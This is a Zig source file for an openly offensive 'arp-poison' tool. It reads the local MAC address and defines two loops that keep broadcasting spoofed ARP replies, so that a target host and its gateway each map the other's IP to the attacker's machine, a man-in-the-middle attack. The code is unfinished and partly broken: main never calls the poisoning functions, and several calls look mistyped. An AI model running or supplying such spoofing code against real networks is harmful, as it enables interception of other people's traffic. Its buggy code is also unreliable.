const std = @import("std");
const zigcap = @import("zigcap");

const Allocator = std.mem.Allocator;

const Eth = zigcap.Eth;
const IPv4 = zigcap.IPv4;
const ARP = zigcap.ARP;
const Layer = zigcap.Layer;
const Packet = zigcap.Packet;
const Pcap = zigcap.PcapWrapper;

const c = @cImport({
    @cInclude("unistd.h");
    @cInclude("sys/socket.h");
    @cInclude("sys/ioctl.h");
    @cInclude("net/if.h");
});

const help: []const []const u8 = &[_][]const u8{
    "Usage: arp-poison <iface> <target_ip> <gateway_ip>",
    "<iface> - the name of the interface you want to send ARP packets from",
    "<target_ip> - the IPv4 address of the target network iphine.",
    "<gateway_ip> - the IPv4 address of the gateway that target network iphine uses.",
    "Example: arp-poison wlan0 192.168.0.44 192.168.0.1",
};

pub fn getMacAddress(ifname: []const u8) !Eth.MacAddress {
    const fd = c.socket(c.AF_INET, c.SOCK_DGRAM, 0);
    if (fd < 0)
        return error.SocketFailed;
    defer _ = c.close(fd);

    var ifr: c.struct_ifreq = std.mem.zeroes(c.struct_ifreq);

    const len = @min(ifname.len, c.IFNAMSIZ - 1);
    @memcpy(ifr.ifr_ifrn.ifrn_name[0..len], ifname[0..len]);
    ifr.ifr_ifrn.ifrn_name[len] = 0;

    if (c.ioctl(fd, c.SIOCGIFHWADDR, &ifr) < 0)
        return error.IoctlFailed;

    var mac = Eth.MacAddress.init_from_array(.{ 0, 0, 0, 0, 0, 0 });
    @memcpy(mac.addr[0..], ifr.ifr_ifru.ifru_hwaddr.sa_data[0..6]);
    return mac;
}

pub fn main() !void {
    var debug_allocator: std.heap.DebugAllocator(.{}) = .init;
    defer _ = debug_allocator.deinit();

    const allocator = debug_allocator.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 2 or std.mem.eql(u8, args[1], "-h") or std.mem.eql(u8, args[1], "--help")) {
        for (help) |hs| {
            std.debug.print("{s}\n", .{hs});
        }

        return;
    }

    if (args.len < 4) {
        std.debug.print("Not enough args supplied.\n", .{});
        for (help) |hs| {
            std.debug.print("{s}\n", .{hs});
        }

        return;
    }

    const provided_iface_name = args[1];
    const provided_target_ip = args[2];
    const provided_gateway_ip = args[3];

    const target_ip: IPv4.IPv4Address = try IPv4.IPv4Address.init_from_string(provided_target_ip);
    const gateway_ip: IPv4.IPv4Address = try IPv4.IPv4Address.init_from_string(provided_gateway_ip);

    _ = target_ip;
    _ = gateway_ip;

    var ifaces = Pcap.Interfaces.init(allocator) catch |err| {
        std.debug.print("Failed to open interfaces: {s}\n", .{@errorName(err)});
        return;
    };
    defer ifaces.deinit();

    const ifaces_profiles = ifaces.get_all() catch |err| {
        std.debug.print("Failed to open interfaces: {s}\n", .{@errorName(err)});
        return;
    };

    _ = ifaces_profiles;

    var iface: *Pcap.Interface = ifaces.find_by_name(provided_iface_name) orelse {
        std.debug.print("Failed to find interface with the IPv4 Address provided.\n", .{});
        return;
    };

    iface.open(allocator) catch |err| {
        std.debug.print("Failed to open interface: {s}\n", .{@errorName(err)});
        return;
    };

    const local_mac = try getMacAddress(provided_iface_name);

    const str = try local_mac.to_string(allocator);

    std.debug.print("{s}\n", .{str});

    allocator.free(str);
}

fn gateway_2_client_poison(
    allocator: Allocator,
    iface: *Pcap.Interface,
    local_mac: Eth.MacAddress,
    target_ip: IPv4.IPv4Address,
    gateway_ip: IPv4.IPv4Address,
) !void {
    var eth_layer: Eth.EthLayer = try Eth.EthLayer.init(allocator);
    const eth_hdr: *Eth.EthHeader = eth_layer.get_mutable_header();

    eth_hdr.set_eth_type(.ARP);

    eth_hdr.set_src_mac(local_mac);
    eth_hdr.set_dst_mac(try Eth.MacAddress.to_string("FF:FF:FF:FF:FF:FF"));

    var arp_layer: ARP.ARPLayer = try ARP.ARPLayer.init(allocator);
    defer arp_layer.deinit();

    const arp_hdr: ARP.ARPHeader = arp_layer.get_mutable_header();

    arp_hdr.set_target_ip(target_ip);
    arp_hdr.set_sender_ip(gateway_ip);
    arp_hdr.set_opcode(.Reply);

    var packet = Packet.create(allocator, allocator);
    defer packet.deinit();

    var layer = Layer{ .ethLayer = eth_layer };

    packet.add_layer(&layer);

    layer = Layer{ .arpLayer = arp_layer };

    packet.add_layer(&layer);

    while (true) {
        try iface.send(packet.get_raw());
        std.Thread.sleep(3000);
    }
}

fn client_2_gateway_poison(
    allocator: Allocator,
    iface: *Pcap.Interface,
    local_mac: Eth.MacAddress,
    target_ip: IPv4.IPv4Address,
    gateway_ip: IPv4.IPv4Address,
) !void {
    var eth_layer: Eth.EthLayer = try Eth.EthLayer.init(allocator);
    const eth_hdr: *Eth.EthHeader = eth_layer.get_mutable_header();

    eth_hdr.set_eth_type(.ARP);

    eth_hdr.set_src_mac(local_mac);
    eth_hdr.set_dst_mac(try Eth.MacAddress.to_string("FF:FF:FF:FF:FF:FF"));

    var arp_layer: ARP.ARPLayer = try ARP.ARPLayer.init(allocator);
    defer arp_layer.deinit();

    const arp_hdr: ARP.ARPHeader = arp_layer.get_mutable_header();

    arp_hdr.set_target_ip(gateway_ip);
    arp_hdr.set_sender_ip(target_ip);
    arp_hdr.set_opcode(.Reply);

    var packet = Packet.create(allocator, allocator);
    defer packet.deinit();

    var layer = Layer{ .ethLayer = eth_layer };

    packet.add_layer(&layer);

    layer = Layer{ .arpLayer = arp_layer };

    packet.add_layer(&layer);

    while (true) {
        try iface.send(packet.get_raw());
        std.Thread.sleep(3000);
    }
}
